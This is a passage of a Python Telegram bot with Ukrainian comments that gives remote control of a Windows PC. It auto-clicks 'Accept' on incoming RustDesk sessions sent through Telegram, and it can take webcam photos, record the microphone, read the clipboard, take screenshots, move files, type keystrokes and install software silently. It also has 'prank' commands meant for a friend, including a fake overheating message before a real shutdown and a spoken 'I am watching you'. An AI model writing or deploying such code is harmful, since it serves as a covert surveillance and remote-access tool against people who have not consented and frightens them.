    """Площа вікна - допомагає відрізнити діалог (малий) від головного вікна (велике)."""
    rect = info[2]
    return max(0, rect[2] - rect[0]) * max(0, rect[3] - rect[1])

def _rs_is_window(info):
    """Чи це «справжнє» видиме вікно, а не службовий помічник RustDesk."""
    _title, class_name, _rect, visible = info
    if not visible or _rs_area(info) < RS_MIN_WINDOW_AREA:
        return False
    return (class_name or "").strip().lower() not in RS_IGNORE_CLASSES

def _rs_is_dialog(info):
    """Чи це окреме вікно-діалог RustDesk (а не головне вікно програми)."""
    return _rs_is_window(info) and (info[1] or "").strip().lower() not in RS_MAIN_CLASSES

def _rs_cv_buttons(shot):
    """Шукає кнопки діалогу через cv2. Повертає центри знайдених акцентних кнопок."""
    buttons = []
    try:
        frame = cv2.cvtColor(np.array(shot.convert("RGB")), cv2.COLOR_RGB2BGR)
        height = frame.shape[0]
        hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
        # акцентна (синя) кнопка RustDesk
        mask = cv2.inRange(hsv, np.array([95, 90, 90]), np.array([130, 255, 255]))
        mask[: int(height * 0.45), :] = 0      # кнопки завжди в нижній частині діалогу
        contours, _hierarchy = cv2.findContours(mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        found = []
        for contour in contours:
            x, y, width, box_height = cv2.boundingRect(contour)
            if width >= 40 and box_height >= 18 and width >= box_height:
                found.append((width * box_height, x + width // 2, y + box_height // 2))
        found.sort(reverse=True)
        buttons.extend((x, y) for _area, x, y in found[:2])
    except Exception as e:
        _rs_log(f"cv2: {e}")
    return buttons

def _rs_window_shot(rect):
    """Скріншот області вікна (для cv2 та для фото в Telegram)."""
    left, top, right, bottom = rect
    width, height = right - left, bottom - top
    if width < 40 or height < 40:
        return None
    try:
        return pyautogui.screenshot(region=(int(left), int(top), int(width), int(height)))
    except Exception as e:
        _rs_log(f"screenshot: {e}")
        return None

def _rs_has_dialog_button(hwnd, info):
    """Чи є у вікні характерна кнопка діалогу (перевірка через cv2, з кешем 2.5 с)."""
    now = time.time()
    with RS_CV_LOCK:
        if RS_CV_CACHE["hwnd"] == hwnd and now - RS_CV_CACHE["time"] < 2.5:
            return RS_CV_CACHE["result"]
    shot = _rs_window_shot(info[2])
    result = bool(shot is not None and _rs_cv_buttons(shot))
    with RS_CV_LOCK:
        RS_CV_CACHE["hwnd"] = hwnd
        RS_CV_CACHE["time"] = now
        RS_CV_CACHE["result"] = result
    return result

def _rs_detect_prompt(windows):
    """Знаходить вікно-запит: спершу окремий діалог, далі діалог у головному вікні RustDesk."""
    dialogs = sorted(((hwnd, info) for hwnd, info in windows.items() if _rs_is_dialog(info)),
                     key=lambda pair: _rs_area(pair[1]))
    if dialogs:
        return dialogs[0][0], dialogs[0][1], ""

    mains = sorted(((hwnd, info) for hwnd, info in windows.items() if _rs_is_window(info)),
                   key=lambda pair: _rs_area(pair[1]))
    for hwnd, info in mains[:2]:
        if _rs_has_dialog_button(hwnd, info):
            return hwnd, info, "У вікні RustDesk знайдено діалог підтвердження."
    return None, None, ""

def _rs_endpoints():
    """Активні TCP-з'єднання RustDesk (хто і куди підключений) - сигнал «сесія почалась»."""
    pids = _rs_pids()
    endpoints = set()
    if not pids:
        return endpoints
    try:
        for conn in psutil.net_connections(kind="tcp"):
            if conn.pid in pids and conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                ip = getattr(conn.raddr, "ip", None) or conn.raddr[0]
                port = getattr(conn.raddr, "port", None) or conn.raddr[1]
                endpoints.add((ip, port))
    except (psutil.AccessDenied, OSError):
        pass
    return endpoints

def _rs_approve_mode():
    """Читає режим підтвердження RustDesk (approve-mode) з RustDesk2.toml."""
    config_path = os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "config", "RustDesk2.toml")
    try:
        with open(config_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.lower().startswith("approve-mode") and "=" in line:
                    return line.split("=", 1)[1].strip().strip("'\"") or "password"
    except Exception:
        pass
    return "password (типово)"

def _rs_activate(hwnd):
    """Виводить вікно RustDesk на передній план (обхід блокування фокуса Windows)."""
    user32 = ctypes.windll.user32
    try:
        # HWND передаємо як c_void_p, інакше на 64-бітній системі ctypes ріже його до int
        hwnd_ptr = ctypes.c_void_p(hwnd)
        user32.GetForegroundWindow.restype = ctypes.c_void_p
        user32.ShowWindow(hwnd_ptr, 9)          # SW_RESTORE
        user32.BringWindowToTop(hwnd_ptr)
        user32.keybd_event(0x12, 0, 0, 0)       # Alt down - знімає блокування фокуса
        user32.keybd_event(0x12, 0, 2, 0)       # Alt up
        user32.SetForegroundWindow(hwnd_ptr)
        time.sleep(0.4)
        return user32.GetForegroundWindow() == hwnd
    except Exception as e:
        _rs_log(f"activate: {e}")
        return False

def _rs_click(rect, point):
    """Клік мишею у точці point (координати всередині вікна)."""
    pyautogui.moveTo(int(rect[0] + point[0]), int(rect[1] + point[1]), duration=0.2)
    pyautogui.click()

def _rs_accept_points(shot):
    """Точки-кандидати для кліку по кнопці «Прийняти» (координати всередині вікна)."""
    points = list(_rs_cv_buttons(shot)) if shot is not None else []
    width, height = shot.size if shot is not None else (800, 600)
    points.append((int(width * 0.78), int(height * 0.88)))   # головна кнопка діалогу
    points.append((int(width * 0.60), int(height * 0.88)))
    points.append((int(width * 0.78), int(height * 0.80)))
    unique = []
    for point in points:
        if point not in unique:
            unique.append(point)
    return unique

def _rs_wait_result(hwnd, before_endpoints, timeout=8.0):
    """Чекає результат дії: вікно-запит зникло АБО з'явилося активне з'єднання."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(0.7)
        windows = _rs_windows()
        if hwnd not in windows or not _rs_is_window(windows[hwnd]):
            return True, "вікно запиту закрилося"
        if _rs_endpoints() - before_endpoints:
            return True, "з'явилося активне з'єднання"
    return False, "вікно запиту досі висить"

def rustdesk_accept():
    """Підтверджує вхідне підключення RustDesk. Повертає (успіх, текст для Telegram)."""
    windows = _rs_windows()
    hwnd, info, _note = _rs_detect_prompt(windows)
    if not hwnd:
        return False, ("❌ Не бачу вікна підтвердження RustDesk.\n"
                       "Запит уже скасовано або режим підтвердження = пароль "
                       "(тоді сесія відкривається без кліку).")
    rect = info[2]
    before = _rs_endpoints()
    _rs_activate(hwnd)

    for index, point in enumerate(_rs_accept_points(_rs_window_shot(rect)), start=1):
        try:
            _rs_click(rect, point)
        except Exception as e:
            _rs_log(f"accept click #{index}: {e}")
            continue
        time.sleep(0.8)
        ok, reason = _rs_wait_result(hwnd, before, timeout=4.0)
        if ok:
            return True, f"✅ Підключення прийнято ({reason}, спроба {index})."

    # Резервний варіант - Enter (у діалозі це типово «Прийняти»)
    try:
        _rs_activate(hwnd)
        pyautogui.press("enter")
        time.sleep(0.8)
        ok, reason = _rs_wait_result(hwnd, before, timeout=5.0)
        if ok:
            return True, f"✅ Підключення прийнято ({reason}, Enter)."
    except Exception as e:
        _rs_log(f"accept enter: {e}")

    return False, ("❌ Не вдалося натиснути «Прийняти» автоматично.\n"
                   "Перевір: екран не заблокований, вікно RustDesk не перекрите іншими вікнами, "
                   "або підтверди підключення вручну на ПК.")

def rustdesk_decline():
    """Відхиляє вхідне підключення RustDesk (Escape, далі закриття вікна запиту)."""
    windows = _rs_windows()
    hwnd, _info, _note = _rs_detect_prompt(windows)
    if not hwnd:
        return False, "ℹ️ Вікна підтвердження вже немає - запит скасовано."
    before = _rs_endpoints()
    _rs_activate(hwnd)

    try:
        pyautogui.press("escape")
    except Exception as e:
        _rs_log(f"decline escape: {e}")
    ok, reason = _rs_wait_result(hwnd, before, timeout=4.0)
    if ok:
        return True, f"⛔ Підключення відхилено ({reason})."

    try:
        user32 = ctypes.windll.user32
        user32.PostMessageW.argtypes = [ctypes.c_void_p, ctypes.c_uint,
                                        ctypes.c_size_t, ctypes.c_ssize_t]
        user32.PostMessageW(ctypes.c_void_p(hwnd), 0x0010, 0, 0)   # WM_CLOSE
    except Exception as e:
        _rs_log(f"decline close: {e}")
    ok, reason = _rs_wait_result(hwnd, before, timeout=4.0)
    if ok:
        return True, f"⛔ Вікно запиту закрито ({reason})."
    return False, "❌ Не вдалося відхилити автоматично - закрий вікно RustDesk вручну."

def _rs_prompt_keyboard():
    """Інлайн-кнопки підтвердження підключення."""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ Прийняти", callback_data="rs_accept"),
        types.InlineKeyboardButton("⛔ Відхилити", callback_data="rs_decline"),
    )
    return markup

def get_rustdesk_panel():
    """Інлайн-меню панелі RustDesk (перемикач + оновлення статусу)."""
    markup = types.InlineKeyboardMarkup(row_width=1)
    if RS_CONFIRM_ENABLED:
        markup.add(types.InlineKeyboardButton("⏸ Вимкнути автопідтвердження", callback_data="rs_toggle"))
    else:
        markup.add(types.InlineKeyboardButton("▶️ Увімкнути автопідтвердження", callback_data="rs_toggle"))
    markup.add(types.InlineKeyboardButton("🔄 Оновити статус", callback_data="rs_status"))
    return markup

def _rs_panel_text():
    """Текст панелі RustDesk: чи запущено, скільки з'єднань, режим підтвердження."""
    pids = _rs_pids()
    endpoints = _rs_endpoints()
    lines = [
        "🔔 *RustDesk: підтвердження підключень*",
        "",
        ("🟢 Автопідтвердження: увімкнено" if RS_CONFIRM_ENABLED else "⚪️ Автопідтвердження: вимкнено"),
        (f"🧩 Процесів RustDesk: {len(pids)}" if pids else "🔴 RustDesk не запущено"),
        f"🌐 Активних з'єднань: {len(endpoints)}",
        f"🔐 approve-mode: {_rs_approve_mode()}",
        f"⏳ Запитів у черзі: {len(RS_PENDING)}",
        "",
        "Коли на ПК з'явиться запит на підключення, я надішлю фото вікна",
        "з кнопками «Прийняти» / «Відхилити». «Прийняти» - бот сам",
        "натисне кнопку підтвердження на ПК, без твоєї участі.",
    ]
    if endpoints:
        lines.append("")
        lines.append("Останні з'єднання:")
        for ip, port in sorted(endpoints)[:5]:
            lines.append(f"• `{ip}:{port}`")
    return "\n".join(lines)

def _rs_notify_prompt(hwnd, info, note=""):
    """Надсилає в Telegram запит підтвердження: фото вікна + інлайн-кнопки."""
    rect = info[2]
    remote = ", ".join(f"{ip}:{port}" for ip, port in sorted(_rs_endpoints())[:3]) or "невідомо"
    text = (
        "🔔 *Вхідне підключення RustDesk!*\n\n"
        f"💻 ПК: {PC_NAME}\n"
        f"🌐 З'єднання: `{remote}`\n"
        f"🔐 approve-mode: {_rs_approve_mode()}\n"
    )
    if note:
        text += f"ℹ️ {note}\n"
    text += "\nПідтверди сесію прямо звідси 👇"

    shot = _rs_window_shot(rect)
    if shot is not None:
        try:
            buffer = io.BytesIO()
            shot.convert("RGB").save(buffer, format="JPEG", quality=80)
            buffer.seek(0)
            buffer.name = "rustdesk_request.jpg"
            bot.send_photo(MY_ID, buffer, caption=text, parse_mode="Markdown",
                           reply_markup=_rs_prompt_keyboard())
            return
        except Exception as e:
            _rs_log(f"send_photo: {e}")

    try:
        bot.send_message(MY_ID, text, parse_mode="Markdown", reply_markup=_rs_prompt_keyboard())
    except Exception:
        try:
            bot.send_message(MY_ID, text.replace("*", "").replace("`", ""),
                             reply_markup=_rs_prompt_keyboard())
        except Exception as e:
            _rs_log(f"send_message: {e}")

def _rs_notify_endpoints(endpoints):
    """Повідомляє про нове з'єднання RustDesk (коли окремого вікна-запиту немає)."""
    text = (
        "🔔 *RustDesk: нове з'єднання на ПК*\n\n"
        f"💻 ПК: {PC_NAME}\n"
        + "".join(f"🌐 `{ip}:{port}`\n" for ip, port in sorted(endpoints)[:3])
        + "\nЯкщо це ти - натисни «Прийняти», і я підтверджу вікно на ПК "
          "(якщо воно є). «Відхилити» закриє запит."
    )
    try:
        bot.send_message(MY_ID, text, parse_mode="Markdown", reply_markup=_rs_prompt_keyboard())
    except Exception as e:
        _rs_log(f"notify endpoints: {e}")

def _rs_watch_loop():
    """Фоновий спостерігач: ловить запит/сесію RustDesk і питає підтвердження в Telegram."""
    global RS_KNOWN_ENDPOINTS
    try:
        RS_KNOWN_ENDPOINTS = _rs_endpoints()
    except Exception:
        RS_KNOWN_ENDPOINTS = set()

    while True:
        try:
            if RS_CONFIRM_ENABLED:
                windows = _rs_windows()
                new_endpoints = _rs_endpoints() - RS_KNOWN_ENDPOINTS
                hwnd, info, note = _rs_detect_prompt(windows)
                now = time.time()

                if hwnd:
                    with RS_PROMPT_LOCK:
                        last = RS_PENDING.get(hwnd)
                        should_notify = last is None or now - last > RS_REPROMPT_AFTER
                        if should_notify:
                            RS_PENDING[hwnd] = now
                    if should_notify:
                        RS_KNOWN_ENDPOINTS |= new_endpoints
                        if not note and new_endpoints:
                            note = "З'явилося нове з'єднання RustDesk."
                        _rs_notify_prompt(hwnd, info, note)
                elif new_endpoints:
                    RS_KNOWN_ENDPOINTS |= new_endpoints
                    _rs_notify_endpoints(new_endpoints)

                with RS_PROMPT_LOCK:
                    alive = set(windows)
                    for pending in list(RS_PENDING):
                        if pending not in alive:
                            RS_PENDING.pop(pending, None)
        except Exception as e:
            _rs_log(f"watch loop: {e}")
            time.sleep(5)
        time.sleep(RS_POLL_INTERVAL)

def _rs_action_worker(action):
    """Виконує прийняття/відхилення у фоні, щоб Telegram не чекав на відповідь."""
    try:
        if action == "rs_accept":
            _ok, result = rustdesk_accept()
        else:
            _ok, result = rustdesk_decline()
    except Exception as e:
        result = f"❌ Помилка RustDesk: {e}"

    with RS_PROMPT_LOCK:
        RS_PENDING.clear()
    try:
        bot.send_message(MY_ID, result, reply_markup=get_system_menu())
    except Exception as e:
        _rs_log(f"action result: {e}")

@bot.callback_query_handler(func=lambda call: str(call.data or "").startswith("rs_"))
def handle_rustdesk_callback(call):
    """Обробляє кнопки RustDesk: Прийняти / Відхилити / статус / перемикач."""
    global RS_CONFIRM_ENABLED
    if str(call.from_user.id) != str(MY_ID):
        bot.answer_callback_query(call.id, "⛔ Доступ заборонено")
        return

    action = call.data or ""

    if action == "rs_toggle":
        RS_CONFIRM_ENABLED = not RS_CONFIRM_ENABLED
        bot.answer_callback_query(call.id, "🟢 Автопідтвердження увімкнено" if RS_CONFIRM_ENABLED
                                 else "⚪️ Автопідтвердження вимкнено")
    elif action == "rs_status":
        bot.answer_callback_query(call.id, "🔄 Оновлюю статус")
    elif action == "rs_accept":
        bot.answer_callback_query(call.id, "✅ Приймаю підключення...")
    elif action == "rs_decline":
        bot.answer_callback_query(call.id, "⛔ Відхиляю підключення...")
    else:
        bot.answer_callback_query(call.id, "❓ Невідома дія")
        return

    # Панель статусу - просто перемальовуємо повідомлення
    if action in ("rs_toggle", "rs_status"):
        try:
            bot.edit_message_text(_rs_panel_text(), MY_ID, call.message.message_id,
                                  parse_mode="Markdown", reply_markup=get_rustdesk_panel())
        except Exception:
            try:
                bot.edit_message_text(_rs_panel_text(), MY_ID, call.message.message_id,
                                      reply_markup=get_rustdesk_panel())
            except Exception as e:
                _rs_log(f"edit panel: {e}")
        return

    # Прийняти / Відхилити - прибираємо кнопки і працюємо у фоні
    try:
        bot.edit_message_reply_markup(MY_ID, call.message.message_id, reply_markup=None)
    except Exception:
        pass
    threading.Thread(target=_rs_action_worker, args=(action,), daemon=True).start()

# ==========================================
# 4. ГОЛОВНИЙ ОБРОБНИК КОМАНД ТА КНОПОК
# ==========================================
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if str(message.chat.id) != str(MY_ID): return
    msg = message.text

    # --- НАВІГАЦІЯ ---
    if msg == "🔙 Головне меню":
        bot.send_message(MY_ID, "Головне меню:", reply_markup=get_main_menu())
    elif msg == "🎮 Медіа":
        bot.send_message(MY_ID, "Панель медіа:", reply_markup=get_media_menu())
    elif msg == "⚙️ Система":
        bot.send_message(MY_ID, "Системні налаштування:", reply_markup=get_system_menu())
    elif msg == "📂 Файли":
        bot.send_message(MY_ID, "Робота з файлами:", reply_markup=get_files_menu())
    elif msg == "✨ Трішки магії":
        bot.send_message(MY_ID, "Секретні функції:", reply_markup=get_magic_menu())
    elif msg == "🎭 Розіграші":
        bot.send_message(MY_ID, "🎭 Меню розіграшів (Твій друг буде в шоці):", reply_markup=get_pranks_menu())
    elif msg == "🔙 Назад до магії":
        bot.send_message(MY_ID, "Повертаюсь до магії:", reply_markup=get_magic_menu())
    
    # --- ІНФО ТА МЕДІА ---
    elif msg == "👁 Інфо про ПК":
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        bot.send_message(MY_ID, f"💻 ПК: {PC_NAME}\n🤖 Версія бота: {BOT_VERSION}\n🧠 CPU: {cpu}%\n💾 RAM: {ram}%")
    elif msg == "🔊 Гучність +": pyautogui.press("volumeup", presses=5)
    elif msg == "🔉 Гучність -": pyautogui.press("volumedown", presses=5)
    elif msg == "🔇 Мут": pyautogui.press("volumemute")
    elif msg == "⏯ Плей/Пауза": pyautogui.press("playpause")
    elif msg == "🖥 Скріншот":
        try:
            screen_buf = capture_screen_io()
            bot.send_photo(MY_ID, screen_buf)
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Не вдалося зробити скріншот: {e}")
    
    # --- СИСТЕМА ТА ІНШЕ ---
    elif msg == "📸 Фото з камери":
        bot.send_message(MY_ID, "Робимо photo... 📷")
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("cam.jpg", frame)
                with open("cam.jpg", "rb") as f: bot.send_photo(MY_ID, f)
                os.remove("cam.jpg")
            cap.release()
        else:
            bot.send_message(MY_ID, "❌ Камера не знайдена або зайнята іншою програмою.")
    elif msg == "🖥 Дистанційне керування":
        bot.send_message(MY_ID, "🔎 Перевіряю RustDesk / AnyDesk на ПК...")
        threading.Thread(target=remote_desktop_worker, daemon=True).start()
    elif msg == "🔔 RustDesk захист":
        try:
            bot.send_message(MY_ID, _rs_panel_text(), parse_mode="Markdown",
                             reply_markup=get_rustdesk_panel())
        except Exception:
            bot.send_message(MY_ID, _rs_panel_text().replace("*", "").replace("`", ""),
                             reply_markup=get_rustdesk_panel())
    elif msg == "📥 Встановити додаток":
        bot.send_message(MY_ID,
                         "📥 *Автоматичне встановлення*\n\n"
                         "Обери програму - я завантажу та встановлю її тихо у фоні:",
                         parse_mode="Markdown", reply_markup=get_install_menu())
    elif msg == "📝 Процеси":
        procs = sorted(psutil.process_iter(['name', 'memory_percent']), key=lambda x: x.info['memory_percent'], reverse=True)[:5]
        text = "🔝 ТОП-5 процесів:\n" + "\n".join([f"🔸 {p.info['name']} ({round(p.info['memory_percent'],1)}%)" for p in procs])
        bot.send_message(MY_ID, text)
    elif msg == "📋 Буфер обміну":
        text = pyperclip.paste()
        bot.send_message(MY_ID, f"📋 Текст у буфері ПК:\n`{text}`", parse_mode="Markdown")

    # --- ТЕСТОВА КНОПКА ---
    elif msg == "🏓 Пінг":
        bot.send_message(MY_ID, f"🏓 Понг! Бот оновився успішно і працює чудово!\nПоточна версія: `{BOT_VERSION}`", parse_mode="Markdown")

    # --- 🔥 КНОПКИ РОЗІГРАШІВ СЕРЕД ДРУЗІВ ---
    elif msg == "🟢 Ефект Матриці":
        # start примусово відкриває видиме вікно CMD, а cmd /v /k вмикає випадкові числа зеленого кольору
        os.system('start cmd /v /k "color 0a & mode con: cols=80 lines=25 & for /L %i in () do @echo !random! !random! !random! !random! !random!"')
        bot.send_message(MY_ID, "🟢 Розіграш 'Матриця' запущено на екрані ПК!")

    elif msg == "🔊 Комп'ютер говорить":
        os.system('mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""Hello. I am watching you.""):close")')
        bot.send_message(MY_ID, "🔊 Голос успішно відтворено через динаміки ноутбука!")

    elif msg == "🚨 Самознищення":
        os.system('shutdown /s /t 90 /c "Увага! Виявлено критичний перегрів процесора. Ноутбук вибухне через 90 секунд."')
        bot.send_message(MY_ID, "🚨 Таймер запущено! У тебе є 90 секунд, щоб натиснути кнопку скасування!")

    elif msg == "🛑 Скасувати вимкнення":
        os.system('shutdown /a')
        bot.send_message(MY_ID, "🛑 Фейкове самознищення успішно скасовано! Друг може видихнути.")

    elif msg == "🎵 Рикролл":
        webbrowser.open('[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ)')
        bot.send_message(MY_ID, "🎵 Рикролл активовано! Rick Astley вже співає на повну.")

    # --- СКЛАДНІ ФУНКЦІЇ КЕРУВАННЯ ---
    elif msg == "📥 Скачати файл з ПК":
        msg_prompt = bot.send_message(MY_ID, "📁 Напиши повний шлях до файлу:", parse_mode="Markdown")
        bot.register_next_step_handler(msg_prompt, process_download)
        
    elif msg == "📤 Закинути на ПК":
        msg_prompt = bot.send_message(MY_ID, "📂 Куди саме зберегти файл? Напиши шлях або `дефолт`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg_prompt, process_upload_path)

    elif msg == "⚠️ Вивести текст":
        msg_prompt = bot.send_message(MY_ID, "💬 Напиши текст для вікна на ПК:")
        bot.register_next_step_handler(msg_prompt, process_alert)

    elif msg == "🌐 Відкрити сайт":
        msg_prompt = bot.send_message(MY_ID, "🌍 Скинь посилання:")
        bot.register_next_step_handler(msg_prompt, process_website)

    elif msg == "🗣 Озвучити текст":
        msg_prompt = bot.send_message(MY_ID, "🗣 Що сказати голосом через динаміки ПК?")
        bot.register_next_step_handler(msg_prompt, process_tts_text)

    elif msg == "🎙 Мікрофон":
        bot.send_message(MY_ID, "🎙 Записую 10 секунд звуку...")
        threading.Thread(target=record_audio_func).start()
        
    elif msg == "⌨️ Друкар (Текст)":
        msg_prompt = bot.send_message(MY_ID, "⌨️ Введіть текст для автодруку на ПК:")
        bot.register_next_step_handler(msg_prompt, process_typing)

    elif msg == "🔒 Заблокувати екран":
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(MY_ID, "✅ Windows заблоковано!")

    # --- ЖИВЛЕННЯ ---
    elif msg == "❌ Вимкнути ПК":
        bot.send_message(MY_ID, "Вимикаю...")
        os.system("shutdown /s /t 5")
    elif msg == "🔄 Перезавантажити":
        bot.send_message(MY_ID, "Перезавантажую...")
        os.system("shutdown /r /t 5")

    # --- ПЕРЕЗАПУСК БОТА (ОНОВЛЕННЯ З GITHUB) ---
    elif msg == "🔄 Перезапустити бота":
        try:
            bot.send_message(MY_ID, "🔄 Перезапуск бота та оновлення з GitHub...")
        except Exception:
            pass
        time.sleep(1)   # коротка пауза, щоб повідомлення гарантовано дійшло до Telegram
        # sys.exit() у потоці-обробнику вбиває лише сам потік, тому жорстко завершуємо ВЕСЬ процес:
        # скрипт start_internal.bat (run_bot.ps1) підхопить це, перекачає файл з GitHub і запустить нову версію
        os._exit(0)

# --- ФОНОВИЙ СПОСТЕРІГАЧ ВХІДНИХ ПІДКЛЮЧЕНЬ RUSTDESK ---
# Стартуємо до polling: якщо на ПК уже висить запит, бот одразу надішле його в Telegram
threading.Thread(target=_rs_watch_loop, daemon=True).start()

if __name__ == "__main__":
    while True:
        try:
            print("Бот запущений...")
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            error_log = os.path.join(botDir, "bot_errors.txt")
            with open(error_log, "a", encoding="utf-8") as f:
                f.write(f"Помилка мережі/бота ({datetime.datetime.now()}): {str(e)}\n")
            time.sleep(5)